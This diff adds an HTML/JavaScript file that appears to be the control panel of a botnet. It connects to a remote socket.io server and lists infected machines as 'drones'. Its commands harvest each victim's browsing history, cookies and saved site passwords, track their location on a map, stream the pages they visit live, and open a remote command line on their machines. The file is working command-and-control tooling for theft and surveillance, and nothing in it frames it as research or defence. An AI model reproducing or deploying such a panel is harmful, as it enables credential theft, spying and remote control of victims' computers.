@@ -1,0 +1,377 @@
+<!DOCTYPE HTML>
+<html>
+	<head>
+		<style>
+			*{
+				color: white;
+			}
+			body{
+				background-color: black;
+			}
+			#terminal{
+				display: none;
+				color: lime;
+				background-color: rgba(0,0,0,0.5);
+				height: 640px;
+				width: 100%;
+				overflow: auto;
+			}
+			#command{
+				width: 88%;
+				color: lime;
+				background-color: black;
+				height: 3.8%;
+				margin-left: 1.5%;
+				margin-top: 0.2%;
+			}
+			#sendCommand{
+				width: 7%;
+				height: 5%;
+				margin:0;
+				float: right;
+				color: lime;
+				background-color: black;
+				margin-right: 1.3%;
+			}
+			.clear{
+				clear: both;
+			}
+			#return{
+				height:90%;
+			}
+			#right{
+				float: right;
+				width: 20%;
+			}
+			#middle{
+				width: 58%;
+				float: left;
+			}
+			#left{
+				width: 22%;
+				float: left;
+			}
+			#liveTicker{
+				float: right;
+				width: 100%;
+				text-wrap: unrestricted;
+			}
+			#map{
+				width: 100%;
+				height: 100%;
+				position:absolute;
+				left:0px;
+				top:0px;
+				z-index:-1;
+			}
+			#droneList{
+				list-style: none;
+			}
+			#options{
+				display: none;
+			}
+			#selectedDrone{
+				color: lime;
+			}
+			#credentials,#history{
+				text-align: center;
+				display:none;
+			}
+		</style>
+		<script src="socket.io/socket.io.js"></script>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
+		<script src="https://maps.googleapis.com/maps/api/js?v=3.exp&sensor=false"></script>
+    <script>
+	    function initialize() {
+		    var stylez =[
+					  {
+					    "featureType": "water",
+					    "stylers": [
+					      { "color": "#000100" },
+					      { "visibility": "on" }
+					    ]
+					  },{
+					    "featureType": "landscape",
+					    "elementType": "geometry.fill",
+					    "stylers": [
+					      { "color": "#0000ff" },
+					      { "weight": 0.1 },
+					      { "hue": "#1900ff" },
+					      { "visibility": "on" }
+					    ]
+					  },{
+					    "elementType": "labels",
+					    "stylers": [
+					      { "visibility": "off" }
+					    ]
+					  },{
+					    "featureType": "landscape.man_made"  },{
+					    "featureType": "landscape",
+					    "stylers": [
+					      { "visibility": "simplified" },{ "color": "#0000ff" }
+					    ]
+					  }
+					]
+		    var MY_MAPTYPE_ID = 'drones';
+	        var mapOptions = {
+	          zoom: 2,
+	          center: new google.maps.LatLng(46.0000, 2.0000),
+	          mapTypeId: google.maps.MapTypeId.ROADMAP,
+	          disableDefaultUI: true
+	        };
+	        
+	        map = new google.maps.Map(document.getElementById('map'),
+            mapOptions);
+
+	        var styledMapOptions = {
+	          name: 'drones'
+	        };
+	
+	        var usRoadMapType = new google.maps.StyledMapType(
+	            stylez, styledMapOptions);
+	
+	        map.mapTypes.set('drones', usRoadMapType);
+	        map.setMapTypeId('drones');
+      }
+
+    </script>  
+		<script>
+		  var socket = io.connect('http://joshbalfour.co.uk:1338');
+		  var droneList = Array();
+		  function getDroneIDs()
+		  {
+			  socket.emit('getDroneIDs');
+		  }
+		  
+		  socket.on('getDroneIDs', function (data) {
+		  		droneList = data;
+			    console.log(data);
+			    for (var i in data)
+			    {
+				    $("#droneList").append("<li class='aDrone'>"+data[i]+"</li>");
+			    }
+			    refreshOnClicks();
+		  });
+		  
+		  function refreshOnClicks(){
+			  $(".aDrone").click(function(){
+			  		$("#selectedDrone").attr('id','');
+				    $(this).attr('id','selectedDrone');
+				    $("#options").show();
+			    });
+		  }
+		  function getDroneInfo(droneID)
+		  {
+			  socket.emit('getDroneInfo',droneID);
+		  }
+		  
+		  socket.on('getDroneInfo', function (data) {
+			    console.log(data);    
+		  });
+		  
+		  function sendGlobalCommand(Command, Params)
+		  {
+			  socket.emit('sendGlobalCommand', { command: Command, args: Params.replace(/\n/g, "") });
+		  }
+		  
+		  socket.on('sendGlobalCommand', function (data) {
+			    console.log(data);    
+		  });  
+		  
+		  function sendCommand(DroneID, Command, Params)
+		  {
+			  socket.emit('sendCommand',{drone: DroneID, command: Command, args: Params.replace(/\n/g, "")})
+		  }
+		  
+		  socket.on('response', function (data) {
+			   var type = data[0];
+			   var theData = data[1];
+			   var source = data[2];
+			   if (theData!="")
+			   {
+				   console.log('new data from: ' + source);
+				   console.log('	data: '+ theData);
+				   $("#middle").children().hide();
+				   switch (type)
+				   {
+					   case 0:
+				            // history
+				            $("#theHistory").html("");
+				            for (var i in theData)
+				            {
+					            var entry = theData[i];
+					            var title = entry[0];
+					          //  if (title==null) {title=entry[1]}
+					            var url = entry[1];
+					            var epochtime = entry[2];
+					            var d = new Date(epochtime/1000); // The 0 there is the key, which sets the date to the epoch
+					            time = d.toUTCString();
+					            $("#theHistory").append("<tr><td>"+time+"</td><td><a href='"+url+"'>"+title+"</a></td></tr>");
+				            }
+				            $("#history").show();
+				            break;
+				        case 1:
+				            //bookmarks
+				            break;
+				        case 2:
+				            //cookies
+				            break;
+				        case 3:
+				            //passwords
+				            $("#theCredentials").html("");
+				            for (var i in theData)
+				            {
+					            var entry = theData[i];
+					            var site = entry[0];
+					            var username = entry[1];
+					            var password = entry[2] || "";
+					            $("#theCredentials").append("<tr><td>"+site+"</td><td>"+username+"</td><td>"+password+"</td></tr>");
+				            }
+				            $("#credentials").show();
+				            break;
+				        case 4:
+				            //position
+				            var newMarker = new google.maps.Marker({
+							  position: new google.maps.LatLng(theData[0], theData[1]), 
+							  map: map, 
+							  title:source});
+							  map.setZoom(5);
+							  map.panTo(newMarker.position);
+				            break;
+				        case 5:
+				            //command returned
+				            $("#return").html(data[1].replace(/\n/g, "<br />"));
+				            terminal = document.getElementById("terminal");
+				            terminal.scrollTop=terminal.scrollHeight;
+				            break;
+				        case 6:
+				        	//new page visited
+				        	console.log(theData);
+				        	lawl = "<tr><td>"+theData[0]+"</td><td>"+theData[1]+"</td></tr>";
+				        	$("#ticker").append(lawl);
+				        	break;
+				        default:
+				            break;
+				   }
+			   }
+		  });  
+		  socket.on('newConnection', function(data){
+			  sessionID=data[0];
+			  ipAddress=data[1];
+			  droneList.push(sessionID);
+			  $("#droneList").append("<li class='aDrone'>"+data[0]+"</li>");
+			  refreshOnClicks();
+		  });
+		  $(document).ready(function(){
+			  	getDroneIDs();
+			  	
+			  	$("#sendCommand").click(function(){
+		  			sendGlobalCommand(5,$("#command").val());
+		  		});
+		  		
+			  	$('#command').keypress(function(e) {
+		            // Enter pressed?
+		            if(e.which == 10 || e.which == 13) {
+		                $("#sendCommand").click();
+		            }
+		        }); 
+		        initialize(); 
+		        $("#options").children().click(function(){
+		        	$("#middle").children().hide();
+			        var command = $(this).attr('command');
+			        var selectedDrone = $("#selectedDrone").text();
+			        var forAll = ($("#selectedDrone").attr('class')=='aDrone allDrones');
+			        console.log(forAll);
+			        if (command!="5")
+			        {
+			        	if (forAll)
+			        	{
+				        	sendGlobalCommand(command,"")
+			        	}
+			        	else
+			        	{
+				        	sendCommand(selectedDrone, command,"");
+				        }
+			        }
+			        else{
+				        $("#terminal").show();
+			        }
+			        
+		        });
+        });
+        
+        
+        
+        </script>
+
+	</head>
+	<body>
+		<div id="map">
+		</div>
+		<div id="container">
+			<div id="left">
+				<div id="drones">
+					<h2>Drones</h2>
+					<ul id="droneList">
+						<li class='aDrone allDrones'>Select All</li>
+					</ul>
+					<ul id="options">
+						<li command="0">Get History</li>
+						<li command="1">Get Bookmarks</li>
+						<li command="2">Get Cookies</li>
+						<li command="3">Get Passwords</li>
+						<li command="4">Get Position</li>
+						<li command="5">Open Command Line</li>
+					</ul>
+				</div>
+			</div>
+			<div id="middle">
+				<div id="terminal">
+					<div id="return"></div>
+					<textarea id="command" rows="1"></textarea>
+					<button id="sendCommand">send</button>
+					<div class="clear"></div>
+				</div>
+				<div id="credentials">
+					<table>
+						<thead>
+							<tr>
+								<th>Site</th>
+								<th>Username</th>
+								<th>Password</th>
+							</tr>
+						</thead>
+						<tbody id="theCredentials">
+						</tbody>
+					</table>
+				</div>
+				<div id="history">
+					<table>
+						<thead>
+							<tr>
+								<th>Time</th>
+								<th>Site</th>
+							</tr>
+						</thead>
+						<tbody id="theHistory">
+						</tbody>
+					</table>
+				</div>
+			</div>
+			<div id="right">
+				<div id="liveTicker">
+					<table>
+						<thead>
+							<tr>
+								<th>Time</th>
+								<th>URL</th>
+							</tr>
+						</thead>
+						<tbody id="ticker">
+						</tbody>
+					</table>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
